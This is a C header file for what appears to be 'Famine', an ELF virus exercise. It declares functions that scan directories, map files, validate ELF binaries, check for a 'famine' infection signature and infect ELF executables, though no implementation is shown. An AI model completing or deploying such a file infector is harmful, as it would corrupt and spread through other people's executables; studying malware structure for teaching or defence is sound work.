#ifndef FAMINE_H
#define FAMINE_H

/* Includes */
#include <dirent.h> // struct dirent
#include <stddef.h> // size_t

/* Defines */
#define SIGNATURE "famine"
#define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1)

/* Structures */
typedef struct s_file {
	const char *path;
	int fd;
	unsigned char *map;
	size_t size;
} t_file;

/* Prototypes */
void scan_directory(const char *path);
void process_entry(const char *path, struct dirent *entry);

void process_file(const char *path);

int load_file(t_file *file, const char *path);
void unload_file(t_file *file);

void process_elf(t_file *file);

int is_valid_elf(t_file *file);
int is_already_infected(t_file *file);
void infect_elf(t_file *file);

#endif
